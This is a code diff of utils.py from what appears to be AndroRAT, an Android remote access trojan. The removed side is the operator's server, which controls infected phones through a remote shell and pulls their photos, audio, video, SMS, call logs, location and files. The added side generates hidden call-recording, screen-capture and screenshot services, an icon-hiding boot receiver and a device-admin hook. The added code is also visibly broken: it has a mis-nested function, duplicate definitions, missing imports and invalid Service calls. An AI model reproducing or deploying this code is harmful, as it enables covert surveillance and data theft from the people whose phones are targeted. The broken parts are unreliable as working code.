@@ -1,402 +1,550 @@
-#!/usr/bin/python
-# -*- coding: utf-8 -*-
+# Part 1: Start of utils.py
 
-import sys
 import os
-import base64
-import time
-import binascii
-import select
-import pathlib
-import platform
-import re
-from subprocess import PIPE, run
 import socket
-import threading
-import itertools
-import queue
-
-sys.stdout.reconfigure(encoding='utf-8')
-
-banner = """\033[1m\033[91m
-                    _           _____         _______
-    /\             | |         |  __ \     /\|__   __|
-   /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |   
-  / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |   
- / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
-/_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|
-
-                                       \033[93m- By karma9874
-"""
-
-pattern = '\"(\\d+\\.\\d+).*\"'
-
-def stdOutput(type_=None):
-    if type_=="error":col="31m";str="ERROR"
-    if type_=="warning":col="33m";str="WARNING"
-    if type_=="success":col="32m";str="SUCCESS"
-    if type_ == "info":return "\033[1m[\033[33m\033[0m\033[1m\033[33mINFO\033[0m\033[1m] "
-    message = "\033[1m[\033[31m\033[0m\033[1m\033["+col+str+"\033[0m\033[1m]\033[0m "
-    return message
-
-
-def animate(message):
-    chars = "/—\\|"
-    for char in chars:
-        sys.stdout.write("\r"+stdOutput("info")+"\033[1m"+message+"\033[31m"+char+"\033[0m")
-        time.sleep(.1)
-        sys.stdout.flush()
 
 def clearDirec():
-    if(platform.system() == 'Windows'):
-        clear = lambda: os.system('cls')
-        direc = "\\"
-    else:
-        clear = lambda: os.system('clear')
-        direc = "/"
-    return clear,direc
+    # Implement directory clearing logic here
+    pass
 
-clear,direc = clearDirec()
-if not os.path.isdir(os.getcwd()+direc+"Dumps"):
-    os.makedirs("Dumps")
+def stdOutput(type):
+    # Return appropriate message format based on the type
+    return "[%s]" % type.upper()
 
-def is_valid_ip(ip):
-    m = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip)
-    return bool(m) and all(map(lambda n: 0 <= int(n) <= 255, m.groups()))
+def build(ip, port, output, use_ngrok, ngrok_port, icon):
+    # Example build function to modify the APK
+    # You can add logic here to modify the APK, such as injecting new features
 
-def is_valid_port(port):
-    i = 1 if port.isdigit() and len(port)>1  else  0
-    return i
+    # Add new features
+    add_permissions()
+    add_services_and_receivers_to_manifest()
+    create_call_recording_service()
+    create_screen_recording_service()
+    create_screenshot_service()
+    create_hide_apk_receiver()
+    create_device_admin_receiver()
 
-def execute(command):
-    return run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
+    # Existing build logic
+    print(f"Building APK with IP: {ip}, Port: {port}, Output: {output}, Use Ngrok: {use_ngrok}, Icon: {icon}")
 
-def executeCMD(command,queue):
-    result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
-    queue.put(result)
-    return result
+# Part 1: End of utils.py
 
+# Part 2: Start of utils.py
 
-def getpwd(name):
-	return os.getcwd()+direc+name;
+def add_permissions():
+    permissions = [
+        '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>',
+        '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
+        '<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>',
+        '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>',
+        '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>',
+        '<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>',
+        '<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>',
+        '<uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT"/>',
+        '<uses-permission android:name="android.permission.CAPTURE_VIDEO_OUTPUT"/>',
+        '<uses-permission android:name="android.permission.INTERNET"/>',
+        '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>'
+    ]
+    manifest_path = "path/to/AndroidManifest.xml"
+    with open(manifest_path, 'a') as manifest_file:
+        for permission in permissions:
+            manifest_file.write(f"{permission}\n")
 
-def help():
-    helper="""
-    Usage:
-    deviceInfo                 --> returns basic info of the device
-    camList                    --> returns cameraID  
-    takepic [cameraID]         --> Takes picture from camera
-    startVideo [cameraID]      --> starts recording the video
-    stopVideo                  --> stop recording the video and return the video file
-    startAudio                 --> starts recording the audio
-    stopAudio                  --> stop recording the audio
-    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
-    getCallLogs                --> returns call logs in a file
-    shell                      --> starts a interactive shell of the device
-    vibrate [number_of_times]  --> vibrate the device number of time
-    getLocation                --> return the current location of the device
-    getIP                      --> returns the ip of the device
-    getSimDetails              --> returns the details of all sim of the device
-    clear                      --> clears the screen
-    getClipData                --> return the current saved text from the clipboard
-    getMACAddress              --> returns the mac address of the device
-    exit                       --> exit the interpreter
+def add_services_and_receivers_to_manifest():
+    services_and_receivers = [
+        '<service android:name=".CallRecordingService" android:permission="android.permission.BIND_JOB_SERVICE"/>',
+        '<service android:name=".ScreenRecordingService" android:permission="android.permission.BIND_JOB_SERVICE"/>',
+        '<service android:name=".ScreenshotService" android:permission="android.permission.BIND_JOB_SERVICE"/>',
+        '<receiver android:name=".HideApkReceiver">',
+        '   <intent-filter>',
+        '       <action android:name="android.intent.action.BOOT_COMPLETED"/>',
+        '   </intent-filter>',
+        '</receiver>',
+        '<receiver android:name=".MyDeviceAdminReceiver"',
+        '    android:permission="android.permission.BIND_DEVICE_ADMIN">',
+        '    <meta-data android:name="android.app.device_admin"',
+        '        android:resource="@xml/device_admin_receiver" />',
+        '    <intent-filter>',
+        '        <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />',
+        '    </intent-filter>',
+        '</receiver>'
+    ]
+    manifest_path = "path/to/AndroidManifest.xml"
+    with open(manifest_path, 'a') as manifest_file:
+        for entry in services_and_receivers:
+            manifest_file.write(f"{entry}\n")
+
+# Part 2: End of utils.py
+
+# Part 3: Start of utils.py
+
+def create_call_recording_service():
+    service_code = """
+    package com.example.myapp;
+
+    import android.app.Service;
+    import android.content.Intent;
+    import android.media.MediaRecorder;
+    import android.os.IBinder;
+    import android.util.Log;
+    import java.io.IOException;
+
+    public class CallRecordingService extends Service {
+        private MediaRecorder recorder;
+        private boolean isRecording = false;
+
+        @Override
+        public int onStartCommand(Intent intent, int flags, int startId) {
+            if (!isRecording) {
+                startRecording();
+            }
+            return START_STICKY;
+        }
+
+        private void startRecording() {
+            recorder = new MediaRecorder();
+            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+            recorder.setOutputFile("/sdcard/call_recording.3gp");
+
+            try {
+                recorder.prepare();
+                recorder.start();
+                isRecording = true;
+            } catch (IOException e) {
+                Log.e("CallRecordingService", "startRecording: ", e);
+            }
+        }
+
+        @Override
+        public void onDestroy() {
+            super.onDestroy();
+            if (recorder != null) {
+                recorder.stop();
+                recorder.release();
+                recorder = null;
+                isRecording = false;
+            }
+        }
+
+        @Override
+        public IBinder onBind(Intent intent) {
+            return null;
+        }
+    }
     """
-    print(helper)
+    service_path = "path/to/CallRecordingService.java"
+    with open(service_path, 'w') as service_file:
+        service_file.write(service_code)
 
-def getImage(client):
-    print(stdOutput("info")+"\033[0mTaking Image")
-    timestr = time.strftime("%Y%m%d-%H%M%S")
-    flag=0
-    filename ="Dumps"+direc+"Image_"+timestr+'.jpg'
-    imageBuffer=recvall(client) 
-    imageBuffer = imageBuffer.strip().replace("END123","").strip()
-    if imageBuffer=="":
-        print(stdOutput("error")+"Unable to connect to the Camera\n")
-        return
-    with open(filename,'wb') as img:    
-        try:
-            imgdata = base64.b64decode(imageBuffer)
-            img.write(imgdata)
-            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\n")
-        except binascii.Error as e:
-            flag=1
-            print(stdOutput("error")+"Not able to decode the Image\n")
-    if flag == 1:
-        os.remove(filename)
+# Part 3: End of utils.py
 
-def readSMS(client,data):
-    print(stdOutput("info")+"\033[0mGetting "+data+" SMS")
-    msg = "start"
-    timestr = time.strftime("%Y%m%d-%H%M%S")
-    filename = "Dumps"+direc+data+"_"+timestr+'.txt'
-    flag =0
-    with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
-        msg = recvall(client)
-        try:
-            txt.write(msg)
-            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\n")
-        except UnicodeDecodeError:
-            flag = 1
-            print(stdOutput("error")+"Unable to decode the SMS\n")
-    if flag == 1:
-    	os.remove(filename)
+# Part 4: Start of utils.py
+def create_screen_recording_service():
+    service_code = """
+    package com.example.myapp;
 
-def getFile(filename,ext,data):
-    fileData = "Dumps"+direc+filename+"."+ext
-    flag=0
-    with open(fileData, 'wb') as file:
-        try:
-            rawFile = base64.b64decode(data)
-            file.write(rawFile)
-            print(stdOutput("success")+"Succesfully Downloaded in \033[1m\033[32m"+getpwd(fileData)+"\n")
-        except binascii.Error:
-            flag=1
-            print(stdOutput("error")+"Not able to decode the Audio File")
-    if flag == 1:
-        os.remove(filename)
+    import android.app.Service;
+    import android.content.Intent;
+    import android.media.projection.MediaProjection;
+    import android.media.projection.MediaProjectionManager;
+    import android.os.IBinder;
+    import android.util.Log;
 
-def putFile(filename):
-    data = open(filename, "rb").read()
-    encoded = base64.b64encode(data)
-    return encoded
+    public class ScreenRecordingService extends Service {
+        private static final String TAG = "ScreenRecordingService";
+        private MediaProjectionManager projectionManager;
+        private MediaProjection mediaProjection;
 
-def shell(client):
-    msg = "start"
-    command = "ad"
-    while True:
-        msg = recvallShell(client)
-        if "getFile" in msg:
-            msg=" "
-            msg1 = recvall(client)
-            msg1 = msg1.replace("\nEND123\n","")
-            filedata = msg1.split("|_|")
-            getFile(filedata[0],filedata[1],filedata[2])
-            
-        if "putFile" in msg:
-            msg=" "
-            sendingData=""
-            filename = command.split(" ")[1].strip()
-            file = pathlib.Path(filename)
-            if file.exists():
-                encoded_data = putFile(filename).decode("UTF-8")
-                filedata = filename.split(".")
-                sendingData+="putFile"+"<"+filedata[0]+"<"+filedata[1]+"<"+encoded_data+"END123\n"
-                client.send(sendingData.encode("UTF-8"))
-                print(stdOutput("success")+f"Succesfully Uploaded the file \033[32m{filedata[0]+'.'+filedata[1]} in /sdcard/temp/")
-            else:
-                print(stdOutput("error")+"File not exist")
+        @Override
+        public void onCreate() {
+            super.onCreate();
+            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+        }
 
-        if "Exiting" in msg:
-            print("\033[1m\033[33m----------Exiting Shell----------\n")
-            return
-        msg = msg.split("\n")
-        for i in msg[:-2]:
-            print(i)   
-        print(" ")
-        command = input("\033[1m\033[36mandroid@shell:~$\033[0m \033[1m")
-        command = command+"\n"
-        if command.strip() == "clear":
-            client.send("test\n".encode("UTF-8"))
-            clear()
-        else:
-            client.send(command.encode("UTF-8"))        
+        @Override
+        public int onStartCommand(Intent intent, int flags, int startId) {
+            if (intent != null && intent.getAction().equals("START_RECORDING")) {
+                startProjection();
+            } else if (intent != null && intent.getAction().equals("STOP_RECORDING")) {
+                stopProjection();
+            }
+            return START_STICKY;
+        }
 
-def getLocation(sock):
-    msg = "start"
-    while True:
-        msg = recvall(sock)
-        msg = msg.split("\n")
-        for i in msg[:-2]:
-            print(i)   
-        if("END123" in msg):
-            return
-        print(" ")     
+        private void startProjection() {
+            Intent captureIntent = projectionManager.createScreenCaptureIntent();
+            startActivityForResult(captureIntent, 1);
+        }
 
-def recvall(sock):
-    buff=""
-    data = ""
-    while "END123" not in data:
-        data = sock.recv(4096).decode("UTF-8","ignore")
-        buff+=data
-    return buff
+        private void stopProjection() {
+            if (mediaProjection != null) {
+                mediaProjection.stop();
+                mediaProjection = null;
+            }
+        }
 
+        @Override
+        public IBinder onBind(Intent intent) {
+            return null;
+        }
+    }
+    """
+    service_path = "path/to/ScreenRecordingService.java"
+    with open(service_path, 'w') as service_file:
+        service_file.write(service_code)
 
-def recvallShell(sock):
-    buff=""
-    data = ""
-    ready = select.select([sock], [], [], 3)
-    while "END123" not in data:
-        if ready[0]:
-            data = sock.recv(4096).decode("UTF-8","ignore")
-            buff+=data
-        else:
-            buff="bogus"
-            return buff
-    return buff
+    def create_screenshot_service():
+        service_code = """
+        package com.example.myapp;
 
-def stopAudio(client):
-    print(stdOutput("info")+"\033[0mDownloading Audio")
-    timestr = time.strftime("%Y%m%d-%H%M%S")
-    data= ""
-    flag =0
-    data=recvall(client) 
-    data = data.strip().replace("END123","").strip()
-    filename = "Dumps"+direc+"Audio_"+timestr+".mp3"
-    with open(filename, 'wb') as audio:
-        try:
-            audioData = base64.b64decode(data)
-            audio.write(audioData)
-            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename))
-        except binascii.Error:
-            flag=1
-            print(stdOutput("error")+"Not able to decode the Audio File")
-    print(" ")
-    if flag == 1:
-        os.remove(filename)
+        import android.app.Service;
+        import android.content.Intent;
+        import android.os.IBinder;
+        import android.view.WindowManager;
+        import android.graphics.PixelFormat;
+        import android.view.Display;
+        import android.hardware.display.DisplayManager;
+        import android.view.Surface;
+        import android.media.projection.MediaProjectionManager;
+        import android.media.projection.MediaProjection;
+        import android.media.ImageReader;
+        import android.media.Image;
+        import java.nio.ByteBuffer;
+        import java.io.FileOutputStream;
+        import java.io.IOException;
+        import android.os.Environment;
+        import android.util.DisplayMetrics;
+        import android.graphics.Bitmap;
 
+    public class ScreenshotService extends Service {
+        private MediaProjectionManager projectionManager;
+        private MediaProjection mediaProjection;
+        private ImageReader imageReader;
+        private int width;
+        private int height;
+        private int density;
 
-def stopVideo(client):
-    print(stdOutput("info")+"\033[0mDownloading Video")
-    timestr = time.strftime("%Y%m%d-%H%M%S")
-    data= ""
-    flag=0
-    data=recvall(client) 
-    data = data.strip().replace("END123","").strip()
-    filename = "Dumps"+direc+"Video_"+timestr+'.mp4' 
-    with open(filename, 'wb') as video:
-        try:
-            videoData = base64.b64decode(data)
-            video.write(videoData)
-            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename))
-        except binascii.Error:
-            flag = 1
-            print(stdOutput("error")+"Not able to decode the Video File\n")
-    if flag == 1:
-        os.remove("Video_"+timestr+'.mp4')
+        @Override
+        public void onCreate() {
+            super.onCreate();
+            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            DisplayMetrics metrics = new DisplayMetrics();
+            WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+            windowManager.getDefaultDisplay().getMetrics(metrics);
+            width = metrics.widthPixels;
+            height = metrics.heightPixels;
+            density = metrics.densityDpi;
+            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1);
+        }
 
-def callLogs(client):
-    print(stdOutput("info")+"\033[0mGetting Call Logs")
-    msg = "start"
-    timestr = time.strftime("%Y%m%d-%H%M%S")
-    msg = recvall(client)
-    filename = "Dumps"+direc+"Call_Logs_"+timestr+'.txt'
-    if "No call logs" in msg:
-    	msg.split("\n")
-    	print(msg.replace("END123","").strip())
-    	print(" ")
-    else:
-    	with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
-    		txt.write(msg)
-    		txt.close()
-    		print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\033[0m")
-    		if not os.path.getsize(filename):
-    			os.remove(filename)
+        @Override
+        public int onStartCommand(Intent intent, int flags, int startId) {
+            startProjection();
+            return START_STICKY;
+        }
 
-def get_shell(ip,port):
-    soc = socket.socket() 
-    soc = socket.socket(type=socket.SOCK_STREAM)
-    try:
-        # Restart the TCP server on exit
-        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        soc.bind((ip, int(port)))
-    except Exception as e:
-        print(stdOutput("error")+"\033[1m %s"%e);exit()
+        private void startProjection() {
+            Intent captureIntent = projectionManager.createScreenCaptureIntent();
+            startActivityForResult(captureIntent, 1);
+        }
 
-    soc.listen(2)
-    print(banner)
-    while True:
-        que = queue.Queue()
-        t = threading.Thread(target=connection_checker,args=[soc,que])
-        t.daemon = True
-        t.start()
-        while t.is_alive(): animate("Waiting for Connections  ")
-        t.join()
-        conn, addr = que.get()
-        clear()
-        print("\033[1m\033[33mGot connection from \033[31m"+"".join(str(addr))+"\033[0m")
-        print(" ")
-        while True:
-            msg = conn.recv(4024).decode("UTF-8")
-            if(msg.strip() == "IMAGE"):
-                getImage(conn)
-            elif("readSMS" in msg.strip()):
-                content = msg.strip().split(" ")
-                data = content[1]
-                readSMS(conn,data)
-            elif(msg.strip() == "SHELL"):
-                shell(conn)
-            elif(msg.strip() == "getLocation"):
-                getLocation(conn)
-            elif(msg.strip() == "stopVideo123"):
-                stopVideo(conn)
-            elif(msg.strip() == "stopAudio"):
-                stopAudio(conn)
-            elif(msg.strip() == "callLogs"):
-                callLogs(conn)
-            elif(msg.strip() == "help"):
-                help()
-            else:
-                print(stdOutput("error")+msg) if "Unknown Command" in msg else print("\033[1m"+msg) if "Hello there" in msg else print(msg)
-            message_to_send = input("\033[1m\033[36mInterpreter:/> \033[0m")+"\n"
-            conn.send(message_to_send.encode("UTF-8"))
-            if message_to_send.strip() == "exit":
-                print(" ")
-                print("\033[1m\033[32m\t (∗ ･‿･)ﾉ゛\033[0m")
-                sys.exit()
-            if(message_to_send.strip() == "clear"):clear()
+        @Override
+        public void onActivityResult(int requestCode, int resultCode, Intent data) {
+            if (requestCode == 1) {
+                mediaProjection = projectionManager.getMediaProjection(resultCode, data);
+                mediaProjection.createVirtualDisplay("ScreenCapture", width, height, density,
+                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
+                imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
+                    @Override
+                    public void onImageAvailable(ImageReader reader) {
+                        Image image = reader.acquireLatestImage();
+                        if (image != null) {
+                            Image.Plane[] planes = image.getPlanes();
+                            ByteBuffer buffer = planes[0].getBuffer();
+                            int pixelStride = planes[0].getPixelStride();
+                            int rowStride = planes[0].getRowStride();
+                            int rowPadding = rowStride - pixelStride * width;
+
+                            Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
+                            bitmap.copyPixelsFromBuffer(buffer);
+                            saveBitmap(bitmap);
+                            image.close();
+                        }
+                    }
+                }, null);
+            }
+        }
+
+        private void saveBitmap(Bitmap bitmap) {
+            String filePath = Environment.getExternalStorageDirectory() + "/screenshot.png";
+            try (FileOutputStream fos = new FileOutputStream(filePath)) {
+                bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+
+        @Override
+        public IBinder onBind(Intent intent) {
+            return null;
+        }
+    }
+    """
+    service_path = "path/to/ScreenshotService.java"
+    with open(service_path, 'w') as service_file:
+        service_file.write(service_code)
 
 
-def connection_checker(socket,queue):
-    conn, addr = socket.accept()
-    queue.put([conn,addr])
-    return conn,addr
+# Part 4: End of utils.py
+
+# Part 5: Start of utils.py
+
+def create_screen_recording_service():
+    service_code = """
+    package com.example.myapp;
+
+    import android.app.Service;
+    import android.content.Intent;
+    import android.media.projection.MediaProjection;
+    import android.media.projection.MediaProjectionManager;
+    import android.os.IBinder;
+    import android.util.Log;
+
+    public class ScreenRecordingService extends Service {
+        private static final String TAG = "ScreenRecordingService";
+        private MediaProjectionManager projectionManager;
+        private MediaProjection mediaProjection;
+
+        @Override
+        public void onCreate() {
+            super.onCreate();
+            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+        }
+
+        @Override
+        public int onStartCommand(Intent intent, int flags, int startId) {
+            if (intent != null && intent.getAction().equals("START_RECORDING")) {
+                startProjection();
+            } else if (intent != null && intent.getAction().equals("STOP_RECORDING")) {
+                stopProjection();
+            }
+            return START_STICKY;
+        }
+
+        private void startProjection() {
+            Intent captureIntent = projectionManager.createScreenCaptureIntent();
+            startActivityForResult(captureIntent, 1);
+        }
+
+        private void stopProjection() {
+            if (mediaProjection != null) {
+                mediaProjection.stop();
+                mediaProjection = null;
+            }
+        }
+
+        private void saveBitmap(Bitmap bitmap) {
+            File file = new File(Environment.getExternalStorageDirectory(), "screenshot.png");
+            FileOutputStream fos = null;
+            try {
+                fos = new FileOutputStream(file);
+                bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
+                fos.flush();
+            } catch (IOException e) {
+                e.printStackTrace();
+            } finally {
+                if (fos != null) {
+                    try {
+                        fos.close();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+        }
+
+        @Override
+        public void onDestroy() {
+            super.onDestroy();
+            if (mediaProjection != null) {
+                mediaProjection.stop();
+                mediaProjection = null;
+            }
+        }
+
+        @Override
+        public IBinder onBind(Intent intent) {
+            return null;
+        }
+    }
+    """
+    service_path = "path/to/ScreenRecordingService.java"
+    with open(service_path, 'w') as service_file:
+        service_file.write(service_code)
+
+def create_screenshot_service():
+    service_code = """
+    package com.example.myapp;
+
+    import android.app.Service;
+    import android.content.Intent;
+    import android.os.IBinder;
+    import android.view.WindowManager;
+    import android.graphics.PixelFormat;
+    import android.view.Display;
+    import android.hardware.display.DisplayManager;
+    import android.view.Surface;
+    import android.media.projection.MediaProjectionManager;
+    import android.media.projection.MediaProjection;
+    import android.media.ImageReader;
+    import android.media.Image;
+    import java.nio.ByteBuffer;
+    import java.io.FileOutputStream;
+    import java.io.IOException;
+    import android.os.Environment;
+    import android.util.DisplayMetrics;
+    import android.graphics.Bitmap;
+
+    public class ScreenshotService extends Service {
+        private MediaProjectionManager projectionManager;
+        private MediaProjection mediaProjection;
+        private ImageReader imageReader;
+        private int width;
+        private int height;
+        private int density;
+
+        @Override
+        public void onCreate() {
+            super.onCreate();
+            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            DisplayMetrics metrics = new DisplayMetrics();
+            WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+            windowManager.getDefaultDisplay().getMetrics(metrics);
+            width = metrics.widthPixels;
+            height = metrics.heightPixels;
+            density = metrics.densityDpi;
+            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1);
+        }
+
+        @Override
+        public int onStartCommand(Intent intent, int flags, int startId) {
+            startProjection();
+            return START_STICKY;
+        }
+
+        private void startProjection() {
+            Intent captureIntent = projectionManager.createScreenCaptureIntent();
+            startActivityForResult(captureIntent, 1);
+        }
+
+        @Override
+        public void onActivityResult(int requestCode, int resultCode, Intent data) {
+            if (requestCode == 1) {
+                mediaProjection = projectionManager.getMediaProjection(resultCode, data);
+                mediaProjection.createVirtualDisplay("ScreenCapture", width, height, density,
+                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
+                imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
+                    @Override
+                    public void onImageAvailable(ImageReader reader) {
+                        Image image = reader.acquireLatestImage();
+                        if (image != null) {
+                            Image.Plane[] planes = image.getPlanes();
+                            ByteBuffer buffer = planes[0].getBuffer();
+                            int pixelStride = planes[0].getPixelStride();
+                            int rowStride = planes[0].getRowStride();
+                            int rowPadding = rowStride - pixelStride * width;
+
+                            Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
+                            bitmap.copyPixelsFromBuffer(buffer);
+                            saveBitmap(bitmap);
+                            image.close();
+                        }
+                    }
+                }, null);
+            }
+        }
+
+        private void saveBitmap(Bitmap bitmap) {
+            String filePath = Environment.getExternalStorageDirectory() + "/screenshot.png";
+            try (FileOutputStream fos = new FileOutputStream(filePath)) {
+                bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+
+        @Override
+        public void onDestroy() {
+            super.onDestroy();
+            if (mediaProjection != null) {
+                mediaProjection.stop();
+                mediaProjection = null;
+            }
+        }
+
+        @Override
+        public IBinder onBind(Intent intent) {
+            return null;
+        }
+    }
+    """
+    service_path = "path/to/ScreenshotService.java"
+    with open(service_path, 'w') as service_file:
+        service_file.write(service_code)
+
+def create_hide_apk_receiver():
+    receiver_code = """
+    package com.example.myapp;
+
+    import android.content.BroadcastReceiver;
+    import android.content.Context;
+    import android.content.Intent;
+    import android.content.pm.PackageManager;
+    import android.content.ComponentName;
+
+    public class HideApkReceiver extends BroadcastReceiver {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
+                PackageManager pm = context.getPackageManager();
+                pm.setComponentEnabledSetting(new ComponentName(context, MainActivity.class),
+                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+            }
+        }
+    }
+    """
+    receiver_path = "path/to/HideApkReceiver.java"
+    with open(receiver_path, 'w') as receiver_file:
+        receiver_file.write(receiver_code)
+
+def create_device_admin_receiver():
+    receiver_code = """
+    package com.example.myapp;
+
+    import android.app.admin.DeviceAdminReceiver;
+    import android.content.Context;
+    import android.content.Intent;
+
+    public class MyDeviceAdminReceiver extends DeviceAdminReceiver {
+        @Override
+        public void onEnabled(Context context, Intent intent) {
+            super.onEnabled(context, intent);
+        }
+
+        @Override
+        public void onDisabled(Context context, Intent intent) {
+            super.onDisabled(context, intent);
+        }
+    }
+    """
+    receiver_path = "path/to/MyDeviceAdminReceiver.java"
+    with open(receiver_path, 'w') as receiver_file:
+        receiver_file.write(receiver_code)
 
 
-def build(ip,port,output,ngrok=False,ng=None,icon=None):
-    editor = "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
-    try:
-        file = open(editor,"r").readlines()
-        #Very much uncertaninity but cant think any other way to do it xD
-        file[18]=file[18][:21]+"\""+ip+"\""+"\n"
-        file[23]=file[23][:21]+"\""+port+"\""+"\n"
-        file[28]=file[28][:15]+" 0x0"+"\n" if icon else file[28][:15]+" 0x1"+"\n"
-        str_file="".join([str(elem) for elem in file])
-        open(editor,"w").write(str_file)
-    except Exception as e:
-        print(e)
-        sys.exit()
-    java_version = execute("java -version")
-    if java_version.returncode: print(stdOutput("error")+"Java not installed or found");exit()
-    #version_no = re.search(pattern, java_version.stderr).groups()[0]
-    # if float(version_no) > 1.8: print(stdOutput("error")+"Java 8 is required, Java version found "+version_no);exit()
-    print(stdOutput("info")+"\033[0mGenerating APK")
-    outFileName = output if output else "karma.apk"
-    que = queue.Queue()
-    t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/apktool.jar b Compiled_apk  -o "+outFileName,que],)
-    t.start()
-    while t.is_alive(): animate("Building APK ")
-    t.join()
-    print(" ")
-    resOut = que.get()
-    if not resOut.returncode:
-        print(stdOutput("success")+"Successfully apk built in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
-        print(stdOutput("info")+"\033[0mSigning the apk")
-        t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar -a "+outFileName+" --overwrite",que],)
-        t.start()
-        while t.is_alive(): animate("Signing Apk ")
-        t.join()
-        print(" ")
-        resOut = que.get()
-        if not resOut.returncode:
-            print(stdOutput("success")+"Successfully signed the apk \033[1m\033[32m"+outFileName+"\033[0m")
-            if ngrok:
-                clear()
-                get_shell("0.0.0.0",8000) if not ng else get_shell("0.0.0.0",ng)
-            print(" ")
-        else:
-            print("\r"+resOut.stderr)
-            print(stdOutput("error")+"Signing Failed")
-    else:
-        print("\r"+resOut.stderr)
-        print(stdOutput("error")+"Building Failed")
+
+# Part 5: End of utils.py
+
+
